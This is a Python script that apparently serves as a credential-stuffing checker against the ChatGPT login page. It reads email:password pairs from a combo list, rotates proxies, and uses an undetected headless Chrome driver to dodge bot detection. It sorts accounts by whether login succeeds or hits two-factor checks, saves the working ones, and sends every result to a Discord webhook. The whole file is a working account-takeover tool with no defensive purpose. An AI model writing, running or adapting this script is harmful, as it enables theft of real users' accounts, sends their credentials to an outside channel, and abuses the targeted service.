import os
import time
import json
import random
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import undetected_chromedriver as uc
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

combo_file = "combo.txt"
proxy_file = "proxy.txt"
valid_file = "valid.txt"
results_file = "results-final.json"

combo_list = Path(combo_file).read_text().splitlines()
proxies = Path(proxy_file).read_text().splitlines() if os.path.exists(proxy_file) else []

webhook = input("Discord Webhook URL (leave blank to skip): ").strip()
threads = int(input("How many parallel threads? (e.g. 5): ") or 3)

results = []

def delay(min_ms=3000, max_ms=8000):
    time.sleep(random.randint(min_ms, max_ms) / 1000)

def log_status(status, combo, color="white"):
    colors = {
        "white": "\033[37m", "green": "\033[32m", "yellow": "\033[33m",
        "cyan": "\033[36m", "magenta": "\033[35m", "red": "\033[31m"
    }
    print(f"{colors.get(color, '')}[{status}] {combo}\033[0m")

    if status == "VALID":
        with open(valid_file, "a") as f:
            f.write(combo + "\n")

    results.append({"combo": combo, "status": status})

    if webhook:
        try:
            requests.post(webhook, json={"content": f"**[{status}]** {combo}"})
        except:
            pass

def check_combo(combo, proxy=None):
    email, password = combo.split(":")
    options = uc.ChromeOptions()
    if proxy:
        options.add_argument(f'--proxy-server={proxy}')
    options.add_argument("--no-sandbox")
    options.add_argument("--headless")

    try:
        driver = uc.Chrome(options=options)
        driver.set_page_load_timeout(60)
        driver.get("https://chat.openai.com/auth/login")
        time.sleep(3)

        # Click "Log in"
        buttons = driver.find_elements(By.TAG_NAME, "button")
        for btn in buttons:
            if "Log in" in btn.text:
                btn.click()
                break

        time.sleep(3)
        driver.find_element(By.CSS_SELECTOR, 'input[type="email"]').send_keys(email, Keys.ENTER)
        time.sleep(3)
        driver.find_element(By.CSS_SELECTOR, 'input[type="password"]').send_keys(password, Keys.ENTER)
        time.sleep(6)

        url = driver.current_url
        page_src = driver.page_source

        if "auth/login" in url:
            if "verify" in page_src or "2fa" in page_src:
                log_status("2FA", combo, "cyan")
            else:
                log_status("INVALID", combo, "yellow")
        elif "chat.openai.com" in url:
            log_status("VALID", combo, "green")
        else:
            log_status("UNKNOWN", combo, "magenta")

    except Exception as e:
        log_status("ERROR", combo, "red")
    finally:
        try:
            driver.quit()
        except:
            pass
        delay(4000, 7000)

def runner(start_index):
    for i in range(start_index, len(combo_list), threads):
        proxy = proxies[i % len(proxies)] if proxies else None
        check_combo(combo_list[i], proxy)

if __name__ == "__main__":
    with open(valid_file, "w"): pass
    print(f"\n[X] Starting with {threads} threads and {len(combo_list)} combos.")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for i in range(threads):
            executor.submit(runner, i)

    with open(results_file, "w") as f:
        json.dump(results, f, indent=2)

    print("\n[✓] Done. Results saved.")
